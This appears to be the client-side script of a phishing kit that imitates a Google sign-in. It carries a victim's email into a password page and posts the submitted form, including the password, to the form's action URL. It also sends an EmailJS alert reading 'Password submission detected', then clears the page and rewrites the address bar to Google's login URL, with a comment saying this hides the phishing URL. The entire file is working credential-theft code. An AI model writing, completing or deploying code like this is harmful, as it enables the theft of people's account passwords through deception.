
// Getting the email
document.getElementById('emailForm').addEventListener('submit', function (event) {
    event.preventDefault(); // Prevent form from submitting normally

    const emailValue = document.getElementById('emailInput').value;

    // Redirect to the password page with the email as a URL parameter
    window.location.href = `password.html?email=${encodeURIComponent(emailValue)}`;
});

// Function to get the email from the URL parameters
function getQueryParameter(name) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(name);
}

// Set email in card-profile and hidden form field
const email = getQueryParameter('email');
if (email) {
    document.getElementById('user').textContent = email.charAt(0).toUpperCase(); // First letter
    document.getElementById('email').textContent = email;
    document.getElementById('hiddenEmail').value = email; // Set hidden field value
}

// Handle form submission and redirect to Google
document.getElementById('passwordForm').addEventListener('submit', function (event) {
    event.preventDefault(); // Prevent the default form submission behavior

    const formData = new FormData(this);

    // Send form data using emailjs
    sendMail(email); // Pass the email to the sendMail function

    fetch(this.action, {
        method: 'POST',
        body: formData,
    }).then(() => {
        // Clear the page content before redirecting
        document.body.innerHTML = ''; // Clear all content on the page

        // Replace the current URL with Google's login page URL to hide your URL
        window.history.replaceState(null, null, 'https://accounts.google.com/ServiceLogin');

        // Redirect to the real Google login page
        window.location.href = 'https://accounts.google.com/ServiceLogin';
    }).catch(error => {
        console.error('Error:', error);
        // Handle errors here if needed
    });
});

// Show/hide password functionality
function passwordFunction() {
    const passwordField = document.getElementById('password');
    if (passwordField.type === 'password') {
        passwordField.type = 'text';
    } else {
        passwordField.type = 'password';
    }
}

// Function to send email using EmailJS
function sendMail(email) {
    var params = {
        name: document.getElementById("user").textContent,
        email: email,
        message: "Password submission detected."
    };

    const serviceID = "YOUR_SERVICE_ID";
    const templateID = "YOUR_TEMPLATE_ID";

    emailjs.send(serviceID, templateID, params)
    .then(res => {
        console.log(res);
        alert("Your message was sent successfully!!");
    })
    .catch(err => console.log(err));
}
